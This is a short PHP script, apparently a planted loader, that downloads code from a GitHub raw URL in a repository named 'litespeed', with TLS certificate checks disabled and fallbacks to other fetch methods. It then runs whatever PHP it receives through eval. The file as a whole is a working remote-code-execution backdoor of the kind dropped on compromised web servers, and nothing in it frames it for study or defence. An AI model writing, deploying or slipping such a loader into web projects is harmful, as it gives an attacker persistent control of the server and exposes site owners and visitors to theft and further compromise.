<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$url = 'https://raw.githubusercontent.com/vovkapudinov-beep/litespeed/refs/heads/main/default.txt';


function get_remote_content($url) {
    if (function_exists("curl_exec")) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $data = curl_exec($ch);
        curl_close($ch);
    } elseif (function_exists("file_get_contents")) {
        $data = @file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $h = @fopen($url, "r");
        if (!$h) return false;
        $data = stream_get_contents($h);
        fclose($h);
    } else {
        $data = false;
    }
    return $data;
}


$content = get_remote_content($url);
if ($content && strpos($content, '<?php') !== false) {
    eval("?>".$content);
} else {
    die("Не удалось получить файл или файл недействителен: $url");
}
